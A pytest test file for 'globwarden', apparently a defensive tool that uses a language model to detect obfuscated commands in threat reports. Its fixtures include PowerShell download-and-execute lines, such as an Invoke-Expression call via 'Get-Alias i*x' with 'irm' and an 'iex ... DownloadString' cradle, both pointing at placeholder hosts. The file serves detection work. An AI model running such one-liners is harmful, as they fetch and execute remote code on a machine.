"""Tests for globwarden.engine.detect.find_obfuscation."""

from __future__ import annotations

import base64
import json

import pytest

from globwarden.engine import detect
from globwarden.engine.detect import DetectionError, _chunk_text, find_obfuscation
from globwarden.models import IngestedContent, ObfuscationCategory, SourceType

from .conftest import detection_response_json, wildcard_finding_dict


def _content(text: str = "some report text about obfuscation") -> IngestedContent:
    return IngestedContent(source="test-source", source_type=SourceType.TEXT, text=text)


class TestSuccessfulParsing:
    def test_parses_clean_json_response(self, mock_provider_factory):
        response = detection_response_json([wildcard_finding_dict("f1")])
        provider = mock_provider_factory(responses=[response])

        findings = find_obfuscation(_content(), provider)

        assert len(findings) == 1
        f = findings[0]
        assert f.id == "f1"
        assert f.category == ObfuscationCategory.WILDCARD_RESOLUTION
        assert f.technique_name == "Wildcard Get-Alias resolution of Invoke-Expression"
        assert f.example_snippet == "&(Get-Alias i*x) (irm https://example.com/a)"
        assert 0.0 <= f.confidence <= 1.0
        assert f.attack_mapping.startswith("T1027.010")

    def test_multiple_findings_get_sequential_ids(self, mock_provider_factory):
        response = detection_response_json([wildcard_finding_dict("original-id-1"), wildcard_finding_dict("original-id-2")])
        provider = mock_provider_factory(responses=[response])

        findings = find_obfuscation(_content(), provider)

        assert [f.id for f in findings] == ["f1", "f2"]

    def test_empty_findings_is_valid_result(self, mock_provider_factory):
        provider = mock_provider_factory(responses=[detection_response_json([])])
        findings = find_obfuscation(_content("benign changelog, nothing obfuscation-related"), provider)
        assert findings == []

    def test_sends_json_mode_and_content_in_prompt(self, mock_provider_factory):
        provider = mock_provider_factory(responses=[detection_response_json([])])
        content = _content("UNIQUE_MARKER_TEXT_12345")
        find_obfuscation(content, provider)

        assert len(provider.calls) == 1
        call = provider.calls[0]
        assert call["json_mode"] is True
        assert "UNIQUE_MARKER_TEXT_12345" in call["user_prompt"]
        assert "ObfuscationCategory" not in call["system_prompt"]  # sanity: prompt is prose, not code dump
        assert "wildcard_resolution" in call["system_prompt"]


class TestMarkdownFencedRecovery:
    def test_recovers_json_wrapped_in_code_fence(self, mock_provider_factory):
        raw_json = detection_response_json([wildcard_finding_dict("f1")])
        fenced = f"Here is the analysis:\n```json\n{raw_json}\n```\nLet me know if you need more."
        provider = mock_provider_factory(responses=[fenced])

        findings = find_obfuscation(_content(), provider)

        assert len(findings) == 1
        assert findings[0].category == ObfuscationCategory.WILDCARD_RESOLUTION

    def test_recovers_json_wrapped_in_bare_code_fence(self, mock_provider_factory):
        raw_json = detection_response_json([wildcard_finding_dict("f1")])
        fenced = f"```\n{raw_json}\n```"
        provider = mock_provider_factory(responses=[fenced])

        findings = find_obfuscation(_content(), provider)
        assert len(findings) == 1

    def test_recovers_json_with_leading_trailing_prose_no_fence(self, mock_provider_factory):
        raw_json = detection_response_json([wildcard_finding_dict("f1")])
        wrapped = f"Sure, here's the JSON you asked for:\n{raw_json}\nHope that helps!"
        provider = mock_provider_factory(responses=[wrapped])

        findings = find_obfuscation(_content(), provider)
        assert len(findings) == 1


class TestMalformedResponseHandling:
    def test_raises_clear_error_on_total_garbage(self, mock_provider_factory):
        provider = mock_provider_factory(responses=["I refuse to produce JSON today, sorry!"])

        with pytest.raises(DetectionError) as exc_info:
            find_obfuscation(_content(), provider)

        assert "test-source" in str(exc_info.value)

    def test_raises_on_wrong_top_level_shape(self, mock_provider_factory):
        # Valid JSON, but missing the required "findings" key.
        provider = mock_provider_factory(responses=[json.dumps({"results": []})])

        with pytest.raises(DetectionError):
            find_obfuscation(_content(), provider)

    def test_invalid_category_is_skipped_not_crashed(self, mock_provider_factory):
        bad = wildcard_finding_dict("f1")
        bad["category"] = "not_a_real_category"
        good = wildcard_finding_dict("f2")
        provider = mock_provider_factory(responses=[detection_response_json([bad, good])])

        findings = find_obfuscation(_content(), provider)

        # Only the valid one should survive, renumbered to f1.
        assert len(findings) == 1
        assert findings[0].id == "f1"
        assert findings[0].category == ObfuscationCategory.WILDCARD_RESOLUTION

    def test_missing_required_field_is_skipped_not_crashed(self, mock_provider_factory):
        bad = wildcard_finding_dict("f1")
        del bad["technique_name"]
        provider = mock_provider_factory(responses=[detection_response_json([bad])])

        findings = find_obfuscation(_content(), provider)
        assert findings == []

    def test_confidence_out_of_range_is_clamped(self, mock_provider_factory):
        weird = wildcard_finding_dict("f1")
        weird["confidence"] = 5.0
        provider = mock_provider_factory(responses=[detection_response_json([weird])])

        findings = find_obfuscation(_content(), provider)
        assert findings[0].confidence == 1.0


class TestChunking:
    def test_short_content_is_a_single_chunk(self):
        chunks = _chunk_text("short text", max_chars=1000, overlap=100)
        assert chunks == ["short text"]

    def test_empty_content_returns_one_empty_chunk(self):
        assert _chunk_text("", max_chars=1000, overlap=100) == [""]

    def test_long_content_is_split_with_overlap_and_full_coverage(self):
        text = "".join(f"line{i:05d}\n" for i in range(2000))  # ~14000 chars
        max_chars, overlap = 5000, 500
        chunks = _chunk_text(text, max_chars=max_chars, overlap=overlap)

        assert len(chunks) > 1
        # Every chunk respects the max size.
        assert all(len(c) <= max_chars for c in chunks)
        # The last chunk must reach the end of the original text (no truncation).
        assert text.endswith(chunks[-1])
        # Each chunk after the first must start with exactly the overlap tail
        # of the previous chunk — proves no content is dropped at a boundary.
        for prev_chunk, next_chunk in zip(chunks, chunks[1:], strict=False):
            assert prev_chunk[-overlap:] == next_chunk[:overlap]

    def test_find_obfuscation_merges_findings_across_chunks(self, mock_provider_factory, monkeypatch):
        # Force two chunks regardless of actual content length, so we can test
        # the multi-call merge/renumber path without constructing a giant string.
        monkeypatch.setattr(detect, "_chunk_text", lambda text, **kw: ["chunk one text", "chunk two text"])

        # Both chunks return an identically-shaped single finding on purpose:
        # chunk calls run concurrently now (see module docstring), so which
        # thread's call lands in provider.calls[0] vs [1] is not guaranteed --
        # using the same response for both keeps the *findings* assertion
        # below order-independent while still proving both calls happened.
        chunk_response = detection_response_json([wildcard_finding_dict("f1")])
        provider = mock_provider_factory(responses=[chunk_response, chunk_response])

        findings = find_obfuscation(_content("irrelevant, chunker is mocked"), provider)

        assert provider.call_count == 2
        assert [f.id for f in findings] == ["f1", "f2"]  # renumbered, no collision

        # Both chunk calls should mention they're part of a multi-chunk
        # document -- checked as a set since concurrent completion order
        # doesn't guarantee provider.calls[0] is chunk 1's call.
        user_prompts = {call["user_prompt"] for call in provider.calls}
        assert any("chunk 1 of 2" in p for p in user_prompts)
        assert any("chunk 2 of 2" in p for p in user_prompts)

    def test_chunk_findings_stay_in_source_order_regardless_of_completion_order(self, mock_provider_factory, monkeypatch):
        # Three chunks; the responder introduces a small, deliberately
        # inverted delay so chunk 3's call finishes before chunk 1's -- proves
        # findings are ordered by chunk *position*, not by which thread
        # happened to finish first.
        import time

        monkeypatch.setattr(detect, "_chunk_text", lambda text, **kw: ["chunk one text", "chunk two text", "chunk three text"])

        def _responder(system_prompt: str, user_prompt: str) -> str:
            finding = wildcard_finding_dict("x")  # id is discarded by renumbering either way
            if "chunk 1 of 3" in user_prompt:
                time.sleep(0.05)
                finding["technique_name"] = "from-chunk-1"
            elif "chunk 2 of 3" in user_prompt:
                time.sleep(0.02)
                finding["technique_name"] = "from-chunk-2"
            else:
                finding["technique_name"] = "from-chunk-3"
            return detection_response_json([finding])

        provider = mock_provider_factory(responder=_responder)
        findings = find_obfuscation(_content("irrelevant, chunker is mocked"), provider)

        # Chunk 3's call finishes first (no sleep) and chunk 1's finishes last
        # (longest sleep) -- if results were ordered by completion instead of
        # chunk position, this would read ["from-chunk-3", "from-chunk-2",
        # "from-chunk-1"]. They must instead come back in source order.
        assert [f.technique_name for f in findings] == ["from-chunk-1", "from-chunk-2", "from-chunk-3"]
        assert [f.id for f in findings] == ["f1", "f2", "f3"]  # renumbered sequentially

    def test_images_attached_to_chunk_calls(self, mock_provider_factory):
        provider = mock_provider_factory(responses=[detection_response_json([])])
        content = IngestedContent(source="img-source", source_type=SourceType.IMAGE, text="", images=[b"fakepngbytes"])
        find_obfuscation(content, provider)

        assert provider.calls[0]["images"] == [b"fakepngbytes"]


class TestExampleSnippetDecoding:
    """`example_snippet_b64` (see `prompts.py` rule #3 / `engine.detect
    ._decode_example_snippet`) exists specifically so a verbatim copy of
    messy real-world command-line text never has to survive JSON's own
    string-escaping rules -- base64 output can never contain a quote,
    backslash, or line break, so it can't break the JSON it's embedded in no
    matter what the original text looked like. This is the fix for a real
    production bug: a live scan against a real threat-intel blog failed
    twice with "Expecting ',' delimiter" from an unescaped quote inside a
    plain `example_snippet` string, even after `_parsing.py` gained a
    dedicated repair pass for that exact shape (see test_parsing.py) --
    that repair pass helps but can't be made airtight against every way a
    model can mis-escape manually, so this removes the need for the model
    to escape at all for this field.
    """

    def _b64(self, text: str) -> str:
        return base64.b64encode(text.encode("utf-8")).decode("ascii")

    def test_base64_encoded_snippet_is_decoded(self, mock_provider_factory):
        finding = wildcard_finding_dict("f1")  # already base64-encoded via conftest's _b64
        provider = mock_provider_factory(responses=[detection_response_json([finding])])

        findings = find_obfuscation(_content(), provider)

        assert findings[0].example_snippet == "&(Get-Alias i*x) (irm https://example.com/a)"

    def test_snippet_containing_literal_quotes_round_trips_correctly(self, mock_provider_factory):
        # The exact real-world shape that broke JSON parsing before this
        # fix: a verbatim PowerShell snippet containing an embedded,
        # unescaped double-quote (a string literal inside the obfuscated
        # command itself). Base64-encoding it means the surrounding JSON
        # response never contains this quote as a raw character at all --
        # nothing to escape, nothing to get wrong.
        real_snippet = 'iex (New-Object Net.WebClient).DownloadString("http://x")'
        finding = wildcard_finding_dict("f1")
        finding["example_snippet_b64"] = self._b64(real_snippet)
        provider = mock_provider_factory(responses=[detection_response_json([finding])])

        findings = find_obfuscation(_content(), provider)

        assert findings[0].example_snippet == real_snippet

    def test_snippet_with_backslashes_and_newlines_round_trips_correctly(self, mock_provider_factory):
        real_snippet = 'gal i*x\r\n$c = "C:\\Users\\x" -replace "\\\\", "/"\n& $c'
        finding = wildcard_finding_dict("f1")
        finding["example_snippet_b64"] = self._b64(real_snippet)
        provider = mock_provider_factory(responses=[detection_response_json([finding])])

        findings = find_obfuscation(_content(), provider)

        assert findings[0].example_snippet == real_snippet

    def test_plain_text_example_snippet_still_works_for_leniency(self, mock_provider_factory):
        # A model that ignores the schema and returns the old plain-text
        # `example_snippet` key anyway shouldn't lose the finding entirely.
        finding = wildcard_finding_dict("f1")
        del finding["example_snippet_b64"]
        finding["example_snippet"] = "&(Get-Alias i*x) (irm https://example.com/a)"
        provider = mock_provider_factory(responses=[detection_response_json([finding])])

        findings = find_obfuscation(_content(), provider)

        assert findings[0].example_snippet == "&(Get-Alias i*x) (irm https://example.com/a)"

    def test_invalid_base64_falls_back_to_raw_value_not_dropped(self, mock_provider_factory):
        # A model asked for base64 that returns raw text in that field
        # anyway (ignoring the instruction) shouldn't lose the finding --
        # degrade to using it verbatim rather than discarding real signal.
        finding = wildcard_finding_dict("f1")
        finding["example_snippet_b64"] = "not actually base64! ###"
        provider = mock_provider_factory(responses=[detection_response_json([finding])])

        findings = find_obfuscation(_content(), provider)

        assert findings[0].example_snippet == "not actually base64! ###"

    def test_null_snippet_stays_none(self, mock_provider_factory):
        finding = wildcard_finding_dict("f1")
        finding["example_snippet_b64"] = None
        provider = mock_provider_factory(responses=[detection_response_json([finding])])

        findings = find_obfuscation(_content(), provider)

        assert findings[0].example_snippet is None
